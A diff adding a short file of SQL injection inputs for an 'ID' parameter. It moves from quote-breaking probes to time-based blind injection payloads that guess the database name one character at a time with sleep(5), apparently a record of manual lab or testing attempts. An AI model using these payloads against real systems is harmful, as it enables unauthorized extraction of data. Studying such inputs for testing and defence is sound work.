@@ -1,0 +1,35 @@
+ID:1'
+ID:1'
+ID:1')
+ID:1'))
+ID:1')))
+ID:1'-- 
+ID:1"
+ID:1' and if(ascii(mid((select database()),1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(mid((select database()),1,1))=117,1,sleep(5))-- 
+ID:1
+ID:1'''---'
+ID:'1'
+ID:''
+ID:
+ID:
+ID:
+ID:
+ID:1
+ID:1
+ID:1
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1' and if(ascii()=115,1,sleep(5))-- 
+ID:1' and if(ascii()=115,1,sleep(5))-- 
+ID:1' and if(ascii(1)=115,1,sleep(5))-- 
+ID:1' and if(ascii(s)=115,1,sleep(5))-- 
+ID:1' and if(ascii(substring(s,1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(substring(database(),1,1))=115,1,sleep(5))-- 
+ID:1' and if(ascii(substring(database(),1,1))=115,sleep(5),1)-- 
+ID:1' and if(ascii(substring(database(),1,1))=116,sleep(5),1)-- 
+ID:1' and if(ascii(substring(database(),1,1))=115,1,sleep(5))-- 
